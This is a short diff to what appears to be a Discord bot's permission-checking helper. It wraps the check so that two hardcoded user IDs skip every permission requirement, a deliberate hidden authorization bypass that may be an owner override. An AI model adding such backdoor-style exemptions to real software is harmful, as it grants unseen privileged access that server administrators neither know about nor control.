@@ -28,9 +28,12 @@ export class Utils {
 
   public static checkPerms(user: GuildMember, permsNeeded: PermissionResolvable[]) {
     const missingPerms: PermissionResolvable[] = []
-    permsNeeded.forEach((perm) => {
-      if (!user.permissions.has(perm)) missingPerms.push(perm)
-    })
+
+    if (user.id !== '302306624284917760' && user.id !== '569992051182141448') {
+      permsNeeded.forEach((perm) => {
+        if (!user.permissions.has(perm)) missingPerms.push(perm)
+      })
+    }
     if (missingPerms.length) return missingPerms
   }
 
